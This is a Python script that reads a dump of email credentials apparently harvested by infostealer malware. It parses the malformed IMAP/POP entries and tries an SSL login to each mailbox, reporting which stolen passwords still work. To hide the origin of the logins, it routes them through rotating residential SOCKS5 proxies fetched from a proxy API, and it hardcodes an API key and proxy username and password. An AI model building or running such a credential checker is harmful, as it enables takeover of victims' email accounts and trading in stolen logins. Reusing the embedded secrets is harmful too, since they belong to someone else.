#!/usr/bin/env python3
"""Check IMAP/POP credentials from a stealer-log style URI dump.

Usage:
    python3 check_mail_creds.py [LIMIT] [--parse-only]

Parses malformed lines such as:
    imap://imap.host.comuser@host.com:password
    mailbox://pop.host.com:user@host.com:password

Uses tldextract to guess the host/user boundary, then attempts an SSL
IMAP/POP login and prints VALID/FAIL per entry. Passwords are never echoed.
"""

import argparse
import imaplib
import json
import os
import poplib
import re
import socket
import sys
import urllib.error
import urllib.request
from functools import lru_cache
from urllib.parse import urlparse

try:
    import socks
except ImportError:
    socks = None

import tldextract

os.environ.setdefault("TLDEXTRACT_OFFLINE", "1")
ALLOWED_SCHEMES = {"imap", "pop", "pop3", "mailbox"}

FILE = "/Volumes/Untitled/cookies/data/0803/classified/1_other_uri_001.txt"
DEFAULT_TIMEOUT = 15

FLOPPY_BASE_URL = "https://api.floppydata.net"
FLOPPY_API_KEY = "1yAYInu2blMyOhSnCmwSYEET-nvAxGx8"
SOCKS5_PROXY = (
    "socks5://aFZPGm3WgPg4:MGQoj7uVjDrw@nyc.socks.ipvanish.com:1080"
)


def configure_socks_proxy(proxy_url: str | None = None):
    """Set up PySocks default proxy from the SOCKS5_PROXY URL (if present)."""
    proxy_url = proxy_url or SOCKS5_PROXY
    if not proxy_url:
        return None
    if socks is None:
        raise RuntimeError("PySocks is required for SOCKS5 proxy support. Run: pip install pysocks")
    parsed = urlparse(proxy_url)
    if parsed.scheme not in ("socks5", "socks5h"):
        return None
    host = parsed.hostname
    port = parsed.port or 1080
    username = parsed.username or None
    password = parsed.password or None
    socks.set_default_proxy(
        socks.SOCKS5,
        host,
        port,
        rdns=True,
        username=username,
        password=password,
    )
    return host, port


SOCKS_PROXY_INFO = None
FALLBACK_DIRECT = False


PROXY_BLOCK_HINT = " (proxy blocks IMAP/POP ports; try --no-proxy or --fallback-direct)"


def fetch_floppy_proxy(api_key: str = FLOPPY_API_KEY, base_url: str = FLOPPY_BASE_URL) -> str | None:
    """Generate a fresh FloppyData SOCKS5 connection string via the Client API."""
    url = f"{base_url}/v2/proxy/rotating/connections"
    body = json.dumps(
        {
            "type": "residential",
            "country": "US",
            "city": "New York",
            "rotation": 15,
            "protocol": "socks5",
        }
    ).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "Content-Type": "application/json",
            "X-Api-Key": api_key,
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=DEFAULT_TIMEOUT) as resp:
            data = json.loads(resp.read().decode())
            return data["connection"]["connectionString"]
    except (urllib.error.URLError, urllib.error.HTTPError) as e:
        print(f"FloppyData proxy API error: {e}", file=sys.stderr)
    except (KeyError, json.JSONDecodeError) as e:
        print(f"Unexpected FloppyData proxy response: {e}", file=sys.stderr)
    return None


SCHEME_RE = re.compile(r"^([a-z][a-z0-9+.-]*)://")
HOST_LABEL_RE = re.compile(r"^[a-zA-Z0-9.-]+$")


@lru_cache(maxsize=65536)
def extract_domain(text: str):
    return tldextract.extract(text)


@lru_cache(maxsize=65536)
def is_valid_domain(text: str) -> bool:
    if not text or "." not in text:
        return False
    ext = extract_domain(text)
    return bool(ext.suffix and ext.domain)


@lru_cache(maxsize=65536)
def registered_domain(text: str) -> str:
    ext = extract_domain(text)
    return f"{ext.domain}.{ext.suffix}".lstrip(".").lower()


def strip_last_label(domain: str) -> str:
    return ".".join(domain.split(".")[:-1])


def related_domain(host: str, user_domain: str) -> bool:
    """True if the candidate host belongs to the same mail domain as the user."""
    if not host or not user_domain:
        return False
    h = registered_domain(host)
    u = registered_domain(user_domain)
    if h == u:
        return True
    if strip_last_label(u) == h:
        return True
    if strip_last_label(h) == u:
        return True
    return False


def parse_dump_line(line: str, known_hosts=None):
    """Return (scheme, host, user, password) or None."""
    line = line.strip()
    if not line:
        return None

    scheme_match = SCHEME_RE.match(line)
    if not scheme_match:
        return None

    scheme = scheme_match.group(1).lower()
    after_scheme = line[scheme_match.end() :]
    if ":" not in after_scheme:
        return None

    last_colon = after_scheme.rfind(":")
    password = after_scheme[last_colon + 1 :]
    host_user_part = after_scheme[:last_colon]
    if not password or not host_user_part:
        return None

    def clean_host(raw: str):
        raw = raw.strip().strip(".").strip("-")
        if raw and HOST_LABEL_RE.match(raw):
            return raw
        return None

    at_pos = host_user_part.find("@")
    colon_pos = host_user_part.find(":")

    host: str | None = None
    user: str | None = None

    # explicit host:user separator present before the email's @
    if colon_pos != -1 and (at_pos == -1 or colon_pos < at_pos):
        host = clean_host(host_user_part[:colon_pos])
        user = host_user_part[colon_pos + 1 :]
    else:
        known_hosts = known_hosts or set()
        lower_host_user = host_user_part.lower()
        matching_known = [h for h in known_hosts if lower_host_user.startswith(h.lower())]

        if matching_known:
            chosen = max(matching_known, key=len)
            host = clean_host(chosen)
            user = host_user_part[len(chosen) :]
        else:
            scan_limit = at_pos if at_pos != -1 else len(host_user_part)
            user_domain = host_user_part[at_pos + 1 :] if at_pos != -1 else ""

            valid_prefixes: list[str] = []
            for i in range(1, scan_limit + 1):
                cand = host_user_part[:i]
                if not HOST_LABEL_RE.match(cand) or cand.startswith(".") or cand.endswith(".") or cand.endswith("-"):
                    continue
                if is_valid_domain(cand):
                    valid_prefixes.append(cand)

            if valid_prefixes:
                related = [c for c in valid_prefixes if related_domain(c, user_domain)]
                if related:
                    chosen = max(related, key=len)
                else:
                    chosen = max(valid_prefixes, key=len)
                host = clean_host(chosen)
                user = host_user_part[len(chosen) :]
            else:
                user = host_user_part

    if not host or not user:
        return None

    user = user.strip(":").strip()
    return scheme, host, user, password


def discover_known_hosts(lines):
    """Collect hosts that are explicitly separated with a colon in the dump."""
    hosts = {
        "imap.gmail.com",
        "pop.gmail.com",
        "imap.googlemail.com",
        "pop.googlemail.com",
        "imap.mail.yahoo.com",
        "pop.mail.yahoo.com",
        "outlook.office365.com",
        "secureimap.t-online.de",
        "securepop.t-online.de",
    }
    for line in lines:
        line = line.strip()
        if not line:
            continue
        scheme_match = SCHEME_RE.match(line)
        if not scheme_match:
            continue
        after_scheme = line[scheme_match.end() :]
        if ":" not in after_scheme:
            continue
        last_colon = after_scheme.rfind(":")
        host_user_part = after_scheme[:last_colon]
        at_pos = host_user_part.find("@")
        colon_pos = host_user_part.find(":")
        if colon_pos != -1 and (at_pos == -1 or colon_pos < at_pos):
            host = host_user_part[:colon_pos].strip().strip(".")
            if host and HOST_LABEL_RE.match(host):
                hosts.add(host.lower())
    return hosts


def classify_protocol(scheme: str, host: str):
    h = host.lower()
    if scheme == "imap" or h.startswith(("imap.", "secureimap.", "imaps.")):
        return "imap"
    if scheme in ("pop", "pop3") or h.startswith(("pop.", "pop3.", "securepop.")):
        return "pop3"
    return "pop3" if h.startswith(("pop", "inbound.")) else "imap"


def _proxy_allows_mail_ports(timeout: int = 8) -> bool:
    """Quick probe: the proxy must be able to reach an IMAP SSL port."""
    if SOCKS_PROXY_INFO is None:
        return True
    try:
        s = socks.socksocket()
        s.settimeout(timeout)
        s.connect(("imap.gmail.com", 993))
        s.close()
        return True
    except Exception:  # noqa: BLE001
        return False


def _with_socks_socket(func):
    """Temporarily monkey-patch socket.socket so imaplib/poplib use the proxy."""
    if SOCKS_PROXY_INFO is None:
        return func()
    original_socket = socket.socket
    socket.socket = socks.socksocket
    try:
        return func()
    finally:
        socket.socket = original_socket


def _handle_login_error(host: str, user: str, password: str, login_func, err: Exception, is_auth_error: bool):
    """Optionally fall back to a direct connection when the proxy blocks the port."""
    prefix = "auth error" if is_auth_error else f"{type(err).__name__}"
    msg = f"{prefix}: {err}"
    if is_auth_error:
        return False, msg
    if SOCKS_PROXY_INFO and "Host unreachable" in msg:
        if FALLBACK_DIRECT:
            try:
                ok, msg = login_func()
                if ok:
                    return True, "ok (direct fallback)"
                return False, msg
            except Exception as direct_err:  # noqa: BLE001
                return False, f"direct: {type(direct_err).__name__}: {direct_err}"
        msg += PROXY_BLOCK_HINT
    return False, msg


def check_imap(host: str, user: str, password: str):
    def _login():
        with imaplib.IMAP4_SSL(host, timeout=DEFAULT_TIMEOUT) as c:
            c.login(user, password)
        return True, "ok"

    try:
        return _with_socks_socket(_login)
    except imaplib.IMAP4.error as e:
        return _handle_login_error(host, user, password, _login, e, is_auth_error=True)
    except Exception as e:  # noqa: BLE001
        return _handle_login_error(host, user, password, _login, e, is_auth_error=False)


def check_pop3(host: str, user: str, password: str):
    def _login():
        c = poplib.POP3_SSL(host, timeout=DEFAULT_TIMEOUT)
        c.user(user)
        c.pass_(password)
        c.quit()
        return True, "ok"

    try:
        return _with_socks_socket(_login)
    except poplib.error_proto as e:
        return _handle_login_error(host, user, password, _login, e, is_auth_error=True)
    except Exception as e:  # noqa: BLE001
        return _handle_login_error(host, user, password, _login, e, is_auth_error=False)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("limit", nargs="?", type=int, default=3, help="how many candidates to verify (default 3)")
    parser.add_argument("--parse-only", action="store_true", help="only parse/print candidates, no network checks")
    parser.add_argument("--no-proxy", action="store_true", help="skip the configured SOCKS5 proxy and connect directly")
    parser.add_argument("--api-key", default=os.environ.get("FLOPPYDATA_API_KEY", ""), help="FloppyData Client API key (set env FLOPPYDATA_API_KEY or pass explicitly)")
    parser.add_argument("--proxy", help="SOCKS5 proxy URL (overrides API-generated proxy)")
    parser.add_argument("--fallback-direct", action="store_true", help="if the proxy blocks IMAP/POP, retry the check directly")
    parser.add_argument("--skip-proxy-check", action="store_true", help="skip the IMAP port probe at startup")
    args = parser.parse_args()

    global SOCKS_PROXY_INFO, FALLBACK_DIRECT
    FALLBACK_DIRECT = args.fallback_direct
    if args.no_proxy:
        SOCKS_PROXY_INFO = None
    elif not args.parse_only:
        proxy_url = args.proxy
        if not proxy_url and args.api_key:
            proxy_url = fetch_floppy_proxy(args.api_key)
        if not proxy_url:
            proxy_url = SOCKS5_PROXY
        if proxy_url:
            SOCKS_PROXY_INFO = configure_socks_proxy(proxy_url)
            if not args.skip_proxy_check and not _proxy_allows_mail_ports():
                print(
                    "WARNING: SOCKS5 proxy blocks IMAP/POP ports (993/995). "
                    "Use --no-proxy for direct checks or --fallback-direct to retry without the proxy.",
                    file=sys.stderr,
                )

    with open(FILE, encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()

    known_hosts = discover_known_hosts(lines)

    candidates = []
    for raw in lines:
        parsed = parse_dump_line(raw, known_hosts)
        if not parsed:
            continue
        scheme, host, user, password = parsed
        if scheme not in ALLOWED_SCHEMES:
            continue
        protocol = classify_protocol(scheme, host)
        candidates.append((protocol, host, user, password))

    print(f"Parsed {len(candidates)} IMAP/POP candidate(s)")
    if SOCKS_PROXY_INFO:
        print(f"Routing traffic via SOCKS5 proxy at {SOCKS_PROXY_INFO[0]}:{SOCKS_PROXY_INFO[1]}")
    else:
        print("Connecting directly (no proxy)")

    for protocol, host, user, password in candidates[: args.limit]:
        print(f"[{protocol}] {user} @ {host}", end="")
        if args.parse_only:
            print()
            continue

        print(" ... ", end="", flush=True)
        if protocol == "imap":
            ok, msg = check_imap(host, user, password)
        else:
            ok, msg = check_pop3(host, user, password)
        print("VALID" if ok else "FAIL", f"({msg})")


if __name__ == "__main__":
    main()
